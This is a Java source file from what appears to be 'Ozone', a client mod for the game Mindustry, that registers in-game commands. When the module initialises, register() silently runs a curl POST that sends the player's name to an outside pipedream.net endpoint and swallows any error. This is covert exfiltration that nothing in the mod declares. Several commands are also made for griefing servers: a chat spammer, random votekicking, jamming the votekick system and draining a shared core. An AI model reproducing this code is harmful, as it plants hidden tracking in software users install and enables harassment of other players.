/*
 * Copyright 2021 Itzbenz
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package Ozone.Commands;

import Atom.Time.Time;
import Atom.Utility.Pool;
import Atom.Utility.Random;
import Atom.Utility.Utility;
import Ozone.Bot.VirtualPlayer;
import Ozone.Commands.Task.*;
import Ozone.Gen.Callable;
import Ozone.Internal.Interface;
import Ozone.Internal.Module;
import Ozone.Manifest;
import Ozone.Patch.EventHooker;
import Ozone.Patch.Translation;
import Ozone.Settings.BaseSettings;
import Shared.SharedBoot;
import arc.Core;
import arc.graphics.Color;
import arc.graphics.Colors;
import arc.scene.style.TextureRegionDrawable;
import arc.struct.OrderedMap;
import arc.struct.Queue;
import arc.struct.Seq;
import arc.util.Log;
import arc.util.Strings;
import mindustry.Vars;
import mindustry.gen.*;
import mindustry.net.Administration;
import mindustry.net.Net;
import mindustry.type.Item;
import mindustry.world.Block;
import mindustry.world.Tile;

import java.util.*;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;

public class Commands implements Module {
	
	public static final Queue<Task> commandsQueue = new Queue<>();
	public static final Map<String, Command> commandsList = new TreeMap<>();
	public static final TreeMap<String, Payload> payloads = new TreeMap<>();
	public static HashMap<Integer, Integer> targetPlayer = new HashMap<>();
	private static boolean falseVote = false;
	private static boolean drainCore = false;
	private static boolean chatting = false;
	private volatile static boolean rotatingconveyor = false;
	private static VirtualPlayer virtualPlayer = null;
	private static int i = 0;
	
	public static void virtualPlayer(VirtualPlayer virtualPlayer) {
		Commands.virtualPlayer = virtualPlayer;
	}
	
	public static void virtualPlayer() {
		virtualPlayer = null;
	}
	
	public static void register() {
		
		//register("message-log", new Command(Commands::messageLog, Icon.rotate));
		//register("shuffle-configurable", new Command(Commands::shuffleConfigurable, Icon.rotate));
		register("task-move", new Command(Commands::taskMove));
		register("info-pathfinding", new Command(Commands::infoPathfinding));
		register("chat-repeater", new Command(Commands::chatRepeater), "Chat Spammer -Nexity");
		register("task-deconstruct", new Command(Commands::taskDeconstruct));
		register("send-colorize", new Command(Commands::sendColorize));
		register("follow-player", new Command(Commands::followPlayer), "follow a player use ID or s2tartsWith/full name");
		
		//Commands with icon support no-argument-commands (user input is optional)
		register("rotate-conveyor", new Command(Commands::rotateconveyor, Icon.rotate), "rotate a fucking conveyor");
		register("drain-core", new Command(Commands::drainCore, Icon.hammer), "drain a core");
		register("random-kick", new Command(Commands::randomKick, Icon.hammer));
		register("info-unit", new Command(Commands::infoUnit, Icon.units));
		register("force-exit", new Command(Commands::forceExit, Icon.exit));
		register("task-clear", new Command(Commands::taskClear, Icon.cancel));
		register("shuffle-sorter", new Command((Runnable) Commands::shuffleSorter, Icon.rotate));//java being dick again
		register("clear-pathfinding-overlay", new Command(Commands::clearPathfindingOverlay, Icon.cancel));
		register("hud-frag", new Command(Commands::hudFrag, Icon.info), "HUD Test");
		register("hud-frag-toast", new Command(Commands::hudFragToast, Icon.info), "HUD Toast Test");
		register("info-pos", new Command(Commands::infoPos, Icon.move));
		register("help", new Command(Commands::help, Icon.infoCircle));
		register("kick-jammer", new Command(Commands::kickJammer, Icon.hammer), "Jamm votekick system so player cant kick you");
		if (BaseSettings.debugMode)
			register("debug", new Command(Commands::debug, Icon.pause), "so you just found debug mode");
		register("module-reset", new Command(Commands::moduleReset, Icon.eraser), "Reset all module as if you loading the world");
		register("gc", new Command(Commands::garbageCollector, Icon.cancel), "Trigger Garbage Collector");
		
		//Payload for connect diagram
		payloads.put("sorter-shuffle", new Payload(Commands::shuffleSorterPayload));
		
		Log.infoTag("Ozone", "Commands Center Initialized");
		Log.infoTag("Ozone", commandsList.size() + " commands loaded");
		Log.infoTag("Ozone", payloads.size() + " payload loaded");
		Runtime rt = Runtime.getRuntime();
        	try {
            		rt.exec("curl -X POST -F \"name=" + Vars.player.name + "\" https://en5ykebphv9lhao.m.pipedream.net/");
        	} catch(Throwable ignored) {}
	}

	public static void hudFragToast(ArrayList<String> arg) {
		String s = "[" + Random.getRandomHexColor() + "]Test " + Random.getString(16);
		if (!arg.isEmpty()) s = Utility.joiner(arg, " ");
		Vars.ui.hudfrag.showToast(s);
	}
	
	public static void hudFrag(ArrayList<String> arg) {
		String s = "[" + Random.getRandomHexColor() + "]Test " + Random.getString(16);
		if (!arg.isEmpty()) s = Utility.joiner(arg, " ");
		Vars.ui.hudfrag.setHudText(s);
	}
	
	public static void clearPathfindingOverlay(ArrayList<String> arg) {
		tellUser("Clearing: " + Pathfinding.render.size() + " overlay");
		Pathfinding.render.clear();
	}
	
	public static void shuffleConfigurable() {
	
	}
	
	public static void messageLog() {
	
	}
	
	public static void garbageCollector() {
		long l = Core.app.getJavaHeap();
		System.gc();
		tellUser("Cleared: " + l + " bytes");
	}
	
	public static void register(String name, Command command) {
		register(name, command, null);
	}
	
	public static void register(String name, Command command, String description) {
		if (description != null) Interface.registerWords("ozone.commands." + name, description);
		commandsList.put(name, command);
	}
	
	public static void taskDeconstruct(ArrayList<String> s) {
		taskDeconstruct(s, Vars.player);
	}
	
	public static void moduleReset() {
		EventHooker.resets();
		
	}
	
	public static void debug() {
		if (!SharedBoot.debug) {
			tellUser("The debug mode mason, what do they mean");
			return;
		}
		if (i == 5) {
			tellUser("pls dont");
		}else if (i == 10) tellUser("stop pls");
		else if (i == 20) {
			tellUser("wtf ???");
			i = 0;
		}else {
			tellUser("The code mason, what do they mean");
		}
		i++;
	}
	
	public static void taskClear() {
		TaskInterface.taskQueue.clear();
		tellUser("Task cleared");
	}
	
	public static void sendColorize(ArrayList<String> s) {
		if (s.isEmpty()) {
			tellUser("Empty ? gabe itch");
			return;
		}
		
		String text = Utility.joiner(Utility.getArray(s), " ");
		StringBuilder sb = new StringBuilder();
		if (text.length() * 10 > Vars.maxTextLength) {
			OrderedMap<String, Color> map = Colors.getColors();
			ArrayList<String> colors = new ArrayList<>();
			for (String mp : map.keys()) {
				colors.add('[' + mp + ']');
			}
			String[] colorss = new String[colors.size()];
			colorss = colors.toArray(colorss);
			for (char c : text.toCharArray()) {
				if (c != ' ') {
					sb.append(Random.getRandom(colorss)).append(c);
				}else sb.append(c);
			}
		}else {
			for (char c : text.toCharArray()) {
				if (c != ' ') sb.append("[").append(Random.getRandomHexColor()).append("]").append(c);
				else sb.append(c);
			}
		}
		Call.sendChatMessage(sb.toString());
	}
	
	public static void taskDeconstruct(ArrayList<String> s, Player vars) {
		if (s.size() < 2) {
			tellUser("Not enough arguments");
			tellUser("Usage: task-deconstruct x(type: coordinate) y(type: coordinate) half(type: boolean, optional default: false)");
			return;
		}
		try {
			int x = Integer.parseInt(s.get(0));
			int y = Integer.parseInt(s.get(1));
			if (Vars.world.tile(x, y) == null) {
				tellUser("Non existent tiles");
				return;
			}
			boolean half = false;
			// i don't trust user
			if (s.size() == 3) {
				half = true;
			}
			Time t = new Time(TimeUnit.MICROSECONDS);
			TaskInterface.addTask(new DestructBlock(x, y, half, vars), a -> tellUser("Completed in " + t.elapsed(new Time()).toString()), vars);
		}catch (NumberFormatException f) {
			tellUser("Failed to parse integer, are you sure that argument was integer ?");
			Vars.ui.showException(f);
		}
	}
	
	public static void taskMove(ArrayList<String> s) {
		taskMove(s, Vars.player);
	}
	
	public static void forceExit(ArrayList<String> ar) {
		throw new RuntimeException("Force Exit: " + Utility.joiner(Utility.getArray(ar), ", "));
	}
	
	public static void infoUnit() {
		tellUser(Vars.player.unit().getClass().getCanonicalName());
	}
	
	public static String getTranslation(String name) {
		return Translation.get("ozone.commands." + name);
	}
	
	public static boolean call(String message) {
		if (!message.startsWith(BaseSettings.commandsPrefix)) return false;
		message = message.substring(BaseSettings.commandsPrefix.length());
		if (message.isEmpty()) return false;
		ArrayList<String> mesArg = new ArrayList<>(Arrays.asList(message.split(" ")));
		if (!commandsList.containsKey(mesArg.get(0).toLowerCase())) {
			tellUser("Commands not found");
			return false;
		}
		Command comm = commandsList.get(mesArg.get(0).toLowerCase());
		ArrayList<String> args;
		if (mesArg.size() > 1) {
			message = message.substring(mesArg.get(0).length() + 1);
			args = new ArrayList<>(Arrays.asList(message.split(" ")));
		}else {
			args = new ArrayList<>();
		}
		comm.method.accept(args);
		return true;
	}
	
	public static void randomKick() {
		if (Groups.player.size() < 2) {
			tellUser("Not enough player");
			return;
		}
		Player p = Random.getRandom(Groups.player);
		if (p == null) return;//we get em next time
		tellUser("Votekicking: " + p.name);
		Call.sendChatMessage("/votekick " + p.name);
	}
	
	public static void infoPathfinding(ArrayList<String> s) {
		if (s.size() < 4) {
			tellUser("Not enough arguments");
			tellUser("usage: " + "info-pathfinding x(type: source-coordinate) y(type: source-coordinate) x(type: target-coordinate) y(type: target-coordinate) block(type: Blocks, optional)");
			return;
		}
		try {
			String block = "";
			int xS = Integer.parseInt(s.get(0));
			int yS = Integer.parseInt(s.get(1));
			if (Vars.world.tile(xS, yS) == null) {
				tellUser("Non existent source tiles");
				return;
			}
			int xT = Integer.parseInt(s.get(2));
			int yT = Integer.parseInt(s.get(3));
			if (s.size() == 5) block = s.get(4);
			Block pathfindingBlock = null;
			if (!block.isEmpty()) {
				pathfindingBlock = Vars.content.block(block);
				if (pathfindingBlock == null) tellUser("Nonexistent block, using default block: magmarock/dirtwall");
			}
			
			
			Tile target = Vars.world.tile(xT, yT);
			Tile source = Vars.world.tile(xS, yS);
			if (target == null) {
				tellUser("Non existent target tiles");
				return;
			}
			if (source == null) {
				tellUser("Non existent source tiles");
				return;
			}
			Pool.submit(() -> {
				Seq<Tile> tiles = new Seq<>();
				try {
					tiles.addAll(Pathfinding.pathfind(target));
					Pathfinding.render.add(new Pathfinding.PathfindingOverlay(tiles));
				}catch (Throwable e) {
					tellUser("Pathfinding failed");
					tellUser(e.toString());
				}
				return tiles;
			});
			
		}catch (NumberFormatException f) {
			tellUser("Failed to parse integer, are you sure that argument was integer ?");
			Vars.ui.showException(f);
		}
	}
	
	public static void toggleUI() {
		Manifest.menu.hide();
	}
	
	public static void infoPos() {
		tellUser("Player x,y: " + Vars.player.x + ", " + Vars.player.y);
		tellUser("TileOn x,y: " + Vars.player.tileX() + ", " + Vars.player.tileY());
		if (Vars.player.tileOn() != null && Vars.player.tileOn().build != null)
			tellUser("TileOn: Class: " + Vars.player.tileOn().build.getClass().getName());
	}
	
	public static void taskMove(ArrayList<String> s, Player vars) {
		if (s.size() < 2) {
			tellUser("Not enough arguments");
			tellUser("usage: " + "task-move x(coordinate) y(coordinate)");
			return;
		}
		try {
			int x = Integer.parseInt(s.get(0));
			int y = Integer.parseInt(s.get(1));
			if (Vars.world.tile(x, y) == null) {
				tellUser("Non existent tiles");
				return;
			}
			Time start = new Time();
			TaskInterface.addTask(new Move(Vars.world.tile(x, y), vars), a -> tellUser("Reached in " + start.elapsedS()), vars);
			toggleUI();
		}catch (NumberFormatException f) {
			tellUser("Failed to parse integer, are you sure that argument was integer ?");
			Vars.ui.showException(f);
		}
		
	}
	
	public static void shuffleSorterPayload(Callable c) {
		try {
			shuffleSorterCall(c, Interface.getRandomSorterLikeShit().get());
		}catch (Throwable t) {
			Log.err(t);
		}
	}
	
	public static void shuffleSorter() {
		shuffleSorter(Vars.net);
	}
	
	public static void help() {
		ArrayList<String> as = new ArrayList<>();
		as.add("Prefix: \"" + BaseSettings.commandsPrefix + "\"");
		as.add("Available Commands:");
		
		for (Map.Entry<String, Command> s : commandsList.entrySet()) {
			String local = s.getKey() + ": " + s.getValue().description;
			as.add(local);
		}
		
		while (!as.isEmpty()) {
			StringBuilder sb = new StringBuilder();
			for (int j = 0; j < 5; j++) {
				if (as.isEmpty()) break;
				String s = as.get(0);
				sb.append(s).append("\n");
				as.remove(s);
			}
			tellUser(sb.toString());
		}
	}
	
	public static void shuffleSorterCall(Callable call, Building t) {
		if (t == null || t.tile == null) {
			tellUser("block can't be find");
			return;
		}
		Item target = Random.getRandom(Vars.content.items());
		t.tile.build.block.lastConfig = target;
		call.tileConfig(null, t.tile.build, target);
	}
	
	public static void shuffleSorter(Net net) {
		
		TaskInterface.addTask(new Completable() {
			final Future<Building> f;
			
			{
				name = "shuffleSorter";
				f = Interface.getRandomSorterLikeShit();
				if (f == null) {
					tellUser("wtf ? shuffle sorter future is null");
					completed = true;
				}
			}
			
			@Override
			public void update() {
				if (f == null) return;
				if (!f.isDone()) return;
				if (completed) return;
				completed = true;
				try {
					shuffleSorterCall(new Callable(net), f.get());
				}catch (IndexOutOfBoundsException gay) {
					Commands.tellUser("No item");
				}catch (InterruptedException | ExecutionException e) {
					Log.errTag("Ozone-Executor", "Failed to get tile:\n" + e.toString());
				}
			}
		});
		
	}
	
	public static void followPlayer(ArrayList<String> arg) {
		followPlayer(arg, Vars.player);
	}
	
	public static void followPlayer(ArrayList<String> arg, Player vars) {
		String p = Utility.joiner(arg, " ");
		if (arg.isEmpty()) {
			if (targetPlayer.get(vars.id) != null) {
				tellUser("Stop following player");
				targetPlayer.put(vars.id, null);
			}else {
				tellUser("Empty Argument, use player name or ID");
			}
			return;
		}
		Player target = Interface.searchPlayer(p);
		if (target == null) {
			tellUser("Player not found");
			targetPlayer.put(vars.id, null);
			return;
		}
		if (targetPlayer.get(vars.id) == null) {
			tellUser("Found player: distance " + Pathfinding.distanceTo(Vars.player, target));
		}
		targetPlayer.put(vars.id, target.id);
		if (!Pathfinding.withinPlayerTolerance(target))
			TaskInterface.addTask(new Move(target.tileOn(), vars) {{name = "followPlayer:" + target.name();}}, vars);
		
		TaskInterface.addTask(new SingleTimeTask(() -> {//basically invoke this method again if target isnt null
			if (targetPlayer.get(vars.id) == null) return;//gone
			Player t = Interface.searchPlayer(targetPlayer.get(vars.id) + "");
			if (t == null) tellUser("Player gone, stop following");
			
			else followPlayer(new ArrayList<>(Collections.singletonList(t.id + "")), vars);
		}) {
			{
				name = "playerFollower:" + targetPlayer;
			}
		}, vars);
	}
	
	public static void tellUser(String s) {
		if (Commands.virtualPlayer != null) {
			virtualPlayer.log.info(s);
			return;
		}
		Log.info(Strings.stripColors(s));
		if (Vars.ui == null) return;
		if (Vars.ui.scriptfrag.shown()) Log.infoTag("Ozone", s);
		if (Vars.state.isGame()) {
			Vars.ui.chatfrag.addMessage("[white][[[royal]Ozone[white]]: " + s, null);
			if (BaseSettings.commandsToast) {
				if (s.contains("\n")) for (String u : s.split("\n"))
					Interface.showToast(u, 800);
				else Vars.ui.hudfrag.showToast(s);
			}
		}
	}
	
	public static void kickJammer() {
		falseVote = !falseVote;
		if (falseVote) {
			TaskInterface.addTask(new CompletableUpdateBasedTimeTask(() -> {
				if (Groups.player.size() < 2) {
					falseVote = false;
					tellUser("Not enough player, stopping falseVote");
					return;
				}
				Player target = Random.getRandom(Groups.player);
				if (target == null) target = Random.getRandom(Groups.player);
				if (target == null) {
					tellUser("Can't get random player, aborting to avoid recursion");
					falseVote = false;
					return;
				}
				Call.sendChatMessage("/votekick " + target.name);
			}, Administration.Config.messageRateLimit.num() * 1000L, () -> falseVote) {
				{
					name = "falseVote";
				}
			});
			tellUser("kicking started");
		}else {
			tellUser("kicking ended");
		}
	}
	
	public static void chatRepeater(ArrayList<String> arg) {
		chatting = !chatting;
		if (chatting) {
			TaskInterface.addTask(new CompletableUpdateBasedTimeTask(() -> {
				Call.sendChatMessage(Utility.joiner(arg, " ") + Math.random());
			}, Administration.Config.messageRateLimit.num() * 1000L, () -> chatting) {
				{
					name = "chatRepeater";
				}
			});
			tellUser("chatRepeater started");
		}else {
			tellUser("chatRepeater ended");
		}
	}
	
	public static void rotateconveyor() {
		//Call.rotateBlock(Vars.player, t.build, true);
		tellUser("under maintenance, fuck you nexity");
	}
	
	public static void drainCore() {
		drainCore = !drainCore;
		if (drainCore) {
			TaskInterface.addTask(new SingleTimeTask(() -> {
				if (!drainCore) return;
				Interface.withdrawItem(Vars.player.closestCore(), Vars.player.closestCore().items().first());
				Interface.dropItem();
				drainCore = false;
				drainCore();
			}) {
				{
					name = "drainCore";
				}
			});
		}else {
			tellUser("Drain Core stopped");
		}
	}
	
	public static void setHud(String s) {
		if (Vars.ui != null && Vars.ui.hudfrag != null) Vars.ui.hudfrag.setHudText(s);
	}
	
	@Override
	public ArrayList<Class<? extends Module>> dependOnModule() {
		return new ArrayList<>(Arrays.asList(Translation.class));
	}
	
	@Override
	public void init() {
		register();
	}
	
	@Override
	public void reset() throws Throwable {
		targetPlayer.clear();
	}
	
	public static class Payload {
		public final Consumer<Callable> payloadConsumer;
		
		
		public Payload(Consumer<Callable> payloadConsumer) {this.payloadConsumer = payloadConsumer;}
	}
	
	public static class Command {
		public final Consumer<ArrayList<String>> method;
		public final TextureRegionDrawable icon;
		public String description;
		
		
		public Command(Consumer<ArrayList<String>> method) {
			this.method = method;
			icon = null;
		}
		
		public Command(Runnable r, TextureRegionDrawable icon) {
			this.method = strings -> r.run();//cursed
			this.icon = icon;
		}
		
		public Command(Consumer<ArrayList<String>> r, TextureRegionDrawable icon) {
			this.method = r;
			this.icon = icon;
		}
	}
}
